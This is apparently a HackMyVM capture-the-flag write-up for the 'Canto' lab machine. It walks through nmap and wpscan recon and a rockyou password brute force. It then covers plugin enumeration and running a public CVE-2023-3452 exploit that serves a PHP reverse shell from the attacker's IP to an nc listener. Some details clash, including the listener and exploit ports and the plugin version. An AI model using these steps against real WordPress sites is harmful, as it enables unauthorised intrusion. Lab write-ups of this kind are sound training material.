Canto Virtual - HachmyVm writeup 

<img width="668" height="82" alt="image" src="https://github.com/user-attachments/assets/c8bac0d9-826b-41bd-b09c-ae8f3c93ec22" />

First we create a directory with the name of our machine

┌──(r4v3x㉿kali)-[~/Desktop]

└─$ mkdir Canto
                                                                                                                                                                      
┌──(r4v3x㉿kali)-[~/Desktop]

└─$ cd Canto
                                                                                                                                                                      
┌──(r4v3x㉿kali)-[~/Desktop/Canto]

└─$ 

Then we have to run a arp-scan to detect the IP address that we will be working for 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]

└─$ sudo arp-scan -I eth0 --localnet                               
[sudo] password for r4v3x: 

192.168.15.16   08:00:27:94:41:98       PCS Systemtechnik GmbH

We complete a ping command to check the VM OS

┌──(r4v3x㉿kali)-[~/Desktop/Canto]

└─$ ping 192.168.15.16
PING 192.168.15.16 (192.168.15.16) 56(84) bytes of data.
64 bytes from 192.168.15.16: icmp_seq=1 ttl=64 time=2.50 ms
64 bytes from 192.168.15.16: icmp_seq=2 ttl=64 time=1.48 ms
64 bytes from 192.168.15.16: icmp_seq=3 ttl=64 time=1.27 ms
64 bytes from 192.168.15.16: icmp_seq=4 ttl=64 time=1.71 ms

After this we confirm that we have a Linux device 


Reconnaisance 

We need to run a nmap to discover all the vulnerabilities.

┌──(r4v3x㉿kali)-[~/Desktop/Canto]

└─$ sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.15.16 -oN results.txt 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 19:31 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKkMLZHCokv5rpKTUUfitgdTSiyieZXC1kqsQS8DEnLgk6x5fOmlzHim2qgiwoJhyEJa7Nj1k3K6pwm5RVxEjEU=
|   256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDR8+o8qabpIHzS2zgBZDxfX0Tm5eWBBstEt5QeYN04+
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Ubuntu))
|_http-title: Canto
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.57 (Ubuntu)
|_http-generator: WordPress 7.1.2
MAC Address: 08:00:27:94:41:98 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:32

We open the website using the IP address

<img width="1283" height="564" alt="image" src="https://github.com/user-attachments/assets/89ff444a-e946-4329-908a-6e57aa4c8ead" />

e must check the generator with the wordpress version we see that it has  7.1.2 and also we found a xmlrpc 


<img width="1355" height="71" alt="image" src="https://github.com/user-attachments/assets/a501018b-83a4-4e6f-935e-4450793779c2" />


we erase the view source and the rds and we confirm that it is working 

<img width="744" height="139" alt="image" src="https://github.com/user-attachments/assets/e5860d0e-7e80-4fbc-a4df-6b3a841d0b58" />

Exploitation

We are going to run a wpscan to enumerate users and plugings 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ wpscan --url 'http://192.168.15.16/' -e u,p 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com



[+] erik
 | Found By: Rss Generator (Passive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================================================> (10 / 10) 100.00% Time: 00:00:00
[i] 1 user(s) Identified.
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Sun Oct  4 19:42:39 2026
[+] Requests Done: 1584
[+] Cached Requests: 13
[+] Most response codes received: 404: 1535, 200: 47, 302: 1, 301: 1
[+] Data Sent: 432.389 KB
[+] Data Received: 25.255 MB
[+] Memory used: 302.262 MB
[+] Elapsed time: 00:00:12

We found a user called erik , with this information we can try to access it using 192.168.15.16/wp-login.php

<img width="865" height="615" alt="image" src="https://github.com/user-attachments/assets/7d592c8e-1695-4a15-9875-c49462134e5b" />

It says that the password is not correct because we just wanted to make sure the user exists in the database. 

We must run a new wpscan 

──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ wpscan --url 'http://192.168.15.16/' -U erik -P  /usr/share/wordlists/rockyou.txt  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://192.168.15.16/ [192.168.15.16]
[+] Started: Sun Oct  4 19:52:16 2026
[+] Command Line: wpscan --url http://192.168.15.16/ -U erik -P /usr/share/wordlists/rockyou.txt
[+] Hostname: kali

This took too much time so instead we will try with pugglins

I confirm that the path exists 

<img width="986" height="346" alt="image" src="https://github.com/user-attachments/assets/54f17ec9-6b9d-4548-8658-7c23d3a8d6ff" />

We need to Download a wordlist for Wordpress from Github 

We must go to https://github.com/Perfectdotexe/WordPress-Plugins-List/blob/master/plugins.txt

Click on raw then use wget we download the file called wordlist.txt 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ wget https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/refs/heads/master/plugins.txt
--2026-10-08 10:43:54--  https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/refs/heads/master/plugins.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1607255 (1.5M) [text/plain]
Saving to: ‘plugins.txt’

plugins.txt                                                100%[========================================================================================================================================>]   1.53M  4.91MB/s    in 0.3s    

2026-10-08 10:43:55 (4.91 MB/s) - ‘plugins.txt’ saved [1607255/1607255]


Now we must run a gobuster to enumerate plugins inside our content/plugins website

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ gobuster dir -u 'http://192.168.15.16/wp-content/plugins/' -w plugins.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.15.16/wp-content/plugins/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                plugins.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
akismet              (Status: 301) [Size: 335] [--> http://192.168.15.16/wp-content/plugins/akismet/]
canto                (Status: 301) [Size: 333] [--> http://192.168.15.16/wp-content/plugins/canto/]
Progress: 80086 / 80086 (100.00%)
===============================================================
Finished
===============================================================

How do we know how many plugins does the repository have? 

for this we must run wc -l plugins.txt 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ wc -l plugins.txt                                                                                        
80085 plugins.txt
                     
If we go t the website an add canto/readme.txt the website will provide a readme

<img width="895" height="248" alt="image" src="https://github.com/user-attachments/assets/a105bd93-5b02-40c4-ad9c-fba815839873" />

We found a table tag of 3.0.4, so we will need to search for an exploit 

For this we want to download an exploit for WordPress Plugin Canto 3.0.5 

We will be using:
https://github.com/leoanggal1/CVE-2023-3452-PoC

We complete a git clone 
after clonning our epository we will confim that we have ouur exploit in python format

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ ls
CVE-2023-3452-PoC  plugins.txt  results.txt
                                                                                                                                                                                                                                            
┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ cd CVE-2023-3452-PoC 
                                                                                                                                                                                                                                            
┌──(r4v3x㉿kali)-[~/Desktop/Canto/CVE-2023-3452-PoC]
└─$ ls
assets  CVE-2023-3452.py  README.md

Now let create our payload we hit on the PentestMonkey link 

<img width="892" height="398" alt="image" src="https://github.com/user-attachments/assets/30cee072-4037-48d9-bc19-604ae8a7ce4b" />

Then we click on the php-reverse-shell.php option 

<img width="1003" height="672" alt="image" src="https://github.com/user-attachments/assets/58df3c26-014b-4a54-b6ac-d97b6af8f052" />


Then we have to copy all the code and create a nano file

<img width="1013" height="812" alt="image" src="https://github.com/user-attachments/assets/6df23091-16cd-423e-957b-a9fccad11702" />

IMPORTANTñ
Inside of the nano we need to add the Attacker IP Address 

<img width="420" height="204" alt="image" src="https://github.com/user-attachments/assets/4141301f-c8f5-458e-a750-15e498d9938a" />

Ctrl  + o , Enter , Ctrl + x to save it 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ nano Wordpress_virus.php

We open the port 443 to listen 

┌──(r4v3x㉿kali)-[~/Desktop/Canto]
└─$ sudo nc -nlvp 443                                                                          
[sudo] password for r4v3x: 
listening on [any] 443 ...

Then from a new terminal we copy the full comand and change the information to the one we have     

python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -NC_PORT 3333 -s php-reverse-shell.php

┌──(r4v3x㉿kali)-[~/Desktop]

└─$ python3 CVE-2023-3452.py -u http://192.168.15.16 -LHOST 192.168.15.15 -NC_PORT 444 -s Wordpress_virus.php 



